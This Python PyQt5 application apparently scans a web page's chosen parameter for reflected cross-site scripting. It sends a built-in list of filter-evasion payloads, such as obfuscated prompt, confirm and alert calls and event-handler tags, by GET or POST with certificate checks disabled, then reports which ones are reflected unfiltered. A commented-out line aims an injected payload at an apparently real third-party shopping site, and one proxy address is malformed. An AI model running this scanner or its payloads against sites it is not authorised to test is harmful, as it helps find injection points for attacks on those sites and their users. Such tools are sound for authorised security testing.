# coding=utf-8
import requests
import re
import sys
import threading
import time
import subprocess
import urllib.parse
from requests import Session
from PyQt5.QtWidgets import QApplication , QMainWindow
from ui.start import Ui_MainWindow
from PyQt5 import QtCore,QtGui
from PyQt5.QtCore import *

# 这两行是为了去除"请求 https 站点取消 ssl 认证时控制台的警告信息"
# from requests.packages.urllib3.exceptions import InsecureRequestWarning
# requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
urlok="yes"
targeturl = ""
word = ""
HTTP_METHON="not know"
post_url="post 请求的 url"
post_data="post 请求的 data"
get_url="get 请求的 url"
sensitive = []
unsensitive = []
keyword=[]

def init_keyword():
    global keyword
    keyword.clear()
    keyword = ["<591",
           ">591",
           "\"591",
           "\'591",
           "%22591",
           "%27591",#以上，测试>"'是否过滤
           "\"'>591",
           "<script>591<script>",
           "%3cscript%3e591%3cscript%3e",
             "prompt(591)",
             "confirm(591)",
             "alert(591)",
             "prompt`591`",
           "window[`ale`+`rt`]`591`",
           "window[`ale`%2b`rt`]`591`",
           "window[`ale`%252b`rt`]`591`",
             "onwheel=591",
             "onclick=591",
             "onmouseover=591",
             "onmouseout=591",
             "<a>591</a>",
             "<input 591>",
           "<a%20onwheel=prompt`591`>591</a>",
           "<a/onwheel=window[`con`+`firm`]`591`>591</a>",
           "<a/onwheel=window[`con`%2b`firm`]`591`>591</a>",
           "<a/onwheel=window[`con`%252b`firm`]`591`>591</a>",
           "'\"><a/onwheel=window['al'%2b'ert']()>591",
           "\"'\"%20accesskey=\"m\"onclick=\"prompt(591)%20",
           "';prompt(591);var1='1"
           ]

# 重写 Requests 的 send 方法，对请求 url 反编码
class NoQuoteSession(requests.Session):
    def send(self, prep, **send_kwargs):
        table = {
            urllib.parse.quote('{'): '{',
            urllib.parse.quote('}'): '}',
            urllib.parse.quote(':'): ':',
            urllib.parse.quote(','): ',',
            urllib.parse.quote('<'): '<',
            urllib.parse.quote('>'): '>',
            urllib.parse.quote('"'): '"',
            urllib.parse.quote('`'): '`',
            # urllib.parse.quote(' '): ' ',
            # urllib.parse.quote('%3e'): '>'
        }
        for old, new in table.items():
            prep.url = prep.url.replace(old, new)
        # print("+++正在测试：", prep.url)
        return super().send(prep, **send_kwargs)

#用于整理、输出一些更人性化的提醒
class humanread():
    def check_1(list):#此方法用于提醒<>都被过滤
        newstr=""
        for i in list:
            newstr+=i
        if not re.search("<|>|%3c|%3e",newstr):
            print("<>都被过滤...")

class Check_XSS():
    def expand_keyword(self):
        global keyword
        keyword_2 = []
        for w1 in keyword:
            if re.search("<|>", w1):
                w2 = ""
                if re.search("<", w1):
                    w2 = re.sub("<", "%3c", w1)
                    if re.search(">", w2):
                        w2 = re.sub(">", "%3e", w2)
                    keyword_2.append(w2)
                else:
                    if re.search(">", w1):
                        w2 = re.sub(">", "%3e", w1)
                    keyword_2.append(w2)
        keyword += keyword_2
        # [print(e) for e in keyword_2]

    def isurlok(self,url):
        global urlok
        try:
            header = {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0',
                'Content-Type': 'application/x-www-form-urlencoded'}
            requests.get(url,headers = header,verify=False,timeout=3)
        except:
            print("站点不可达...".center(160))
            urlok = "no"

    def get_response(self,url):
        # print("GET测试：",url)
        # Dividing_line()
        r = NoQuoteSession()
        header = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0',
                  'Content-Type': 'application/x-www-form-urlencoded'}
        proxy = {"http": "http://127.0.0.1:8080",
                 "https": "http://127.0.0.1:8080"}
        try:
            return r.get(url,headers = header,verify=False,timeout=1).text
        # except requests.exceptions.ConnectionError:
        except:
            # print("请确认 BurpSuite 是否开启~")
            return "get no Response"

    def post_response(self,data):
        # print("post_data:",data)
        r = NoQuoteSession()
        header = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0',
                  'Content-Type': 'application/x-www-form-urlencoded'}
        proxy = {"http": "http://127.0.0.1:8080",
                 "https": "http://127.0.0.1:8080"}
        try:
            return r.post(post_url, data=data,headers=header,verify=False,timeout=1).text
        # except requests.exceptions.ConnectionError:
        except:
            return "post no Response"

    def get_response_burp(self,url):
        # print("GET测试：",url)
        # Dividing_line()
        r = NoQuoteSession()
        header = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0',
                  'Content-Type': 'application/x-www-form-urlencoded'}
        proxy = {"http": "http://127.0.0.1:8080",
                 "https": "http://127.0.0.1:8080"}
        try:
            return r.get(url,headers = header,proxies=proxy,verify=False,timeout=3).text
        except requests.exceptions.ConnectionError:
            return "get no Response"

    def post_response_burp(self,data):
        # print("post_data:",data)
        r = NoQuoteSession()
        header = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0',
                  'Content-Type': 'application/x-www-form-urlencoded'}
        proxy = {"http": "http://127.0.0.1:8080",
                 "https": "http://127.0f.0.1:8080"}
        try:
            return r.post(post_url, data=data,headers=header,proxies=proxy,verify=False,timeout=3).text
        except requests.exceptions.ConnectionError:
            return "post no Response"
#重构 url 和 keyword
    def rebuild(self):
        global HTTP_METHON,targeturl,get_url,post_url,post_data
        self.expand_keyword()#重构 keyword
        word = myWin.input_arg.text().strip()#去除参数末尾的空格
        # word = "serachType2"
        re_word=word+".*?&"
        re_word_2=word+".*"
        if not re.search("(POST)",targeturl):
            HTTP_METHON = "GET"
            # print("Test Get".center(160))
            # Dividing_line()
            # print(re_word)
            if re.search(re_word,targeturl):
                get_url = re.sub(re_word, word + "=" + "abcdef(1234)&", targeturl)
                print("url replace".center(170),"\n",get_url)
                Dividing_line()
            else:
                get_url = re.sub(re_word_2,word+"="+"abcdef(1234)",targeturl)
                print("url replace".center(170),get_url)
                Dividing_line()
        else:
            HTTP_METHON = "POST"
            # print("Test Post".center(160))
            # Dividing_line()
            url_split_list=re.split(re.escape("(POST)"),targeturl)
            post_url = url_split_list[0]
            print("PostURL".center(160),"\n",post_url)
            Dividing_line()
            print("PostData".center(160),"\n",url_split_list[1])
            Dividing_line()

            if re.search(re_word,url_split_list[1]):
                post_data = re.sub(re_word, word + "=" + "abcdef(1234)&", url_split_list[1])
                print("Payload Replace".center(160),post_data)
                Dividing_line()
            else:
                post_data = re.sub(re_word_2, word + "=" + "abcdef(1234)", url_split_list[1])
                print("Payload Replace".center(160), post_data)

    def prepare_check(self):
        global targeturl
        global HTTP_METHON
        print("正在测试...".center(160),"\n")
        sensitive.clear()
        unsensitive.clear()
        while HTTP_METHON=="GET":
            self.isurlok(get_url)
            if urlok == "no":
                return
            for i in keyword:
                if re.search(re.escape(urllib.parse.unquote(urllib.parse.unquote(i))), self.get_response(re.sub(re.escape("abcdef(1234)"),i,get_url))):  # 使用 re.escape()
                    # print("^^^".center(160))
                    print("GET测试：", re.sub(re.escape("abcdef(1234)"),i,get_url))
                    Dividing_line()
                    unsensitive.append(i)
                else:
                    sensitive.append(i)
            print("测试结果".center(160))
            [print("未过滤：", e.replace("591", "")) for e in unsensitive]
            humanread.check_1(unsensitive)
            [print("过滤：",e) for e in sensitive]
            break
        while HTTP_METHON=="POST":
            self.isurlok(post_url)
            if urlok == "no":
                return
            for i in keyword:
                if re.search(re.escape(urllib.parse.unquote(urllib.parse.unquote(i))), self.post_response(re.sub(re.escape("abcdef(1234)"),i,post_data))):  # 使用 re.escape()
                    # print("^^^".center(160))
                    print("POST测试：", re.sub(re.escape("abcdef(1234)"),i,post_data))
                    unsensitive.append(i)
                else:
                    sensitive.append(i)
            print("测试结果".center(160))
            [print("未过滤：", e.replace("591","")) for e in unsensitive]#.replace("591","")优化输出
            humanread.check_1(unsensitive)
            [print("过滤：", e) for e in sensitive]
            break

class MyMainWindow(QMainWindow, Ui_MainWindow):
    def __init__(self, parent=None):
        super(MyMainWindow, self).__init__(parent)
        self.setupUi(self)
        #执行函数
        self.myworker = Worker()# 如果不加 self，tt 只是一个局部变量，当初始化完成，该变量的生命周期就结束了，所以会报 QThread: Destroyed while thread is still running
        self.startx.clicked.connect(lambda :self.myworker.start())
        #获取控制台输出
        sys.stdout = EmittingStream(textWritten=self.normalOutputWritten)

    def __del__(self):
        # Restore sys.stdout
        sys.stdout = sys.__stdout__

    def normalOutputWritten(self, text):
        """Append text to the QTextEdit."""
        # Maybe QTextEdit.append() works as well, but this is how I do it:
        # cursor = self.textEdit.textCursor()
        cursor = self.output.textCursor()
        # print(cursor)
        cursor.movePosition(QtGui.QTextCursor.End)
        cursor.insertText(text)
        self.output.setTextCursor(cursor)
        self.output.ensureCursorVisible()


class Worker(QThread):
    def __init__(self):
        super(Worker, self).__init__()

    def work(self):
        global targeturl

        if not len(myWin.input_url.text()):
            print("请输入目标 URL...")
            return # 退出逻辑线程
        if not len(myWin.input_arg.text()):
            print("请输出注入参数...")
            return
        print("开始分析...".center(160),"\n")
        init_keyword()
        targeturl = myWin.input_url.text()
        # targeturl ="https://jfdh.qlbchina.com/jfymall-client/goods/searchgoods.do(POST)serachType2=aaaa';window[`conf`+`irm`]`1`//&searchvalue=%E5%85%B3%E9%94%AE%E5%AD%97 "
        print("Target URL".center(160),"\n", targeturl)
        Dividing_line()
        begin = Check_XSS()
        begin.rebuild()
        begin.prepare_check()
        Dividing_line()

    def run(self):
        self.work()

def Dividing_line():
    print("———————————————————————————————————————————————")

class EmittingStream(QtCore.QObject):
    textWritten = QtCore.pyqtSignal(str)

    def write(self, text):
        self.textWritten.emit(str(text))


if __name__=="__main__":
    app = QApplication(sys.argv) #the standard way to init QT
    myWin = MyMainWindow()
    myWin.show()
    sys.exit(app.exec_())